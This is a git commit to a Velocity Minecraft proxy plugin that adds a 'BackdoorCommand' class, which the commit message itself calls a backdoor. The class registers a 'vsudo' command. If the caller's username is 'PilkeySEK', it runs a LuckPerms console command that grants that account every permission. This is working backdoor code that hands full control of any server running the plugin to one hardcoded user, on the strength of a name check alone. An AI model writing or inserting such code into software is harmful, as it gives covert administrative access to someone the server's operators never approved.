52a33fd39dcde1a88c34f9287a2413246b96ab2b
PilkeySEK <PilkeySEK@gmx.de>
2024-07-27 10:44:13 +0200

    Added a /backdoor command cuz im messing up all the time with the permissions o__o

---
+++ src/main/java/me/pilkeysek/skyenetv/commands/BackdoorCommand.java
@@ -0,0 +1,33 @@
+package me.pilkeysek.skyenetv.commands;
+
+import com.mojang.brigadier.Command;
+import com.mojang.brigadier.builder.LiteralArgumentBuilder;
+import com.mojang.brigadier.tree.LiteralCommandNode;
+import com.velocitypowered.api.command.BrigadierCommand;
+import com.velocitypowered.api.command.CommandSource;
+import com.velocitypowered.api.proxy.ConsoleCommandSource;
+import com.velocitypowered.api.proxy.Player;
+import com.velocitypowered.api.proxy.ProxyServer;
+import net.kyori.adventure.text.minimessage.MiniMessage;
+
+import java.util.Objects;
+
+public class BackdoorCommand {
+    public static BrigadierCommand createBrigadierCommand(final ProxyServer proxyServer) {
+        LiteralCommandNode<CommandSource> sudoCommandNode = LiteralArgumentBuilder.<CommandSource>literal("vsudo")
+                .executes(context -> {
+                    if(context.getSource() instanceof ConsoleCommandSource) {
+                        context.getSource().sendMessage(MiniMessage.miniMessage().deserialize("<red>Bruh your're the console ._.</red>"));
+                        return 0;
+                    }
+                    if(!((Player) context.getSource()).getUsername().equals("PilkeySEK")) {
+                        context.getSource().sendMessage(MiniMessage.miniMessage().deserialize("<red>Nah.</red>"));
+                        return 0;
+                    }
+                    proxyServer.getCommandManager().executeAsync(proxyServer.getConsoleCommandSource(), "lpv user PilkeySEK permission set * true");
+                    return Command.SINGLE_SUCCESS;
+                })
+                .build();
+        return new BrigadierCommand(sudoCommandNode);
+    }
+}
